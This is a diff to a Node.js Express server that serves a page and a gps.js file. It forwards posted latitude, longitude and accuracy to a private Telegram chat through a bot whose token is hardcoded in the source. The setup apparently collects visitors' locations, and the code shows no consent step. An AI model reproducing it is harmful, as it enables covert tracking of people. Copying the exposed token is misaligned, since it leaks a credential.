@@ -3,11 +3,15 @@ const fetch = require('node-fetch');
 const app = express();
 
 app.use(express.json());
+app.use(express.static(__dirname)); // чтобы отдавать статические файлы (например, gps.js)
+
+app.get('/', (req, res) => {
+  res.sendFile(__dirname + '/index.html');
+});
 
 app.post('/send-location', async (req, res) => {
   const { latitude, longitude, accuracy } = req.body;
 
-  // Твой токен Telegram-бота и chat_id
   const telegramToken = '7405407984:AAGwudecZWnjOnDAhMpD6mXx-c3Et8TNAVk';
   const chatId = '7405407984';
 
@@ -18,10 +22,7 @@ app.post('/send-location', async (req, res) => {
   await fetch(url, {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: text
-    })
+    body: JSON.stringify({ chat_id: chatId, text: text })
   });
 
   res.send('ok');
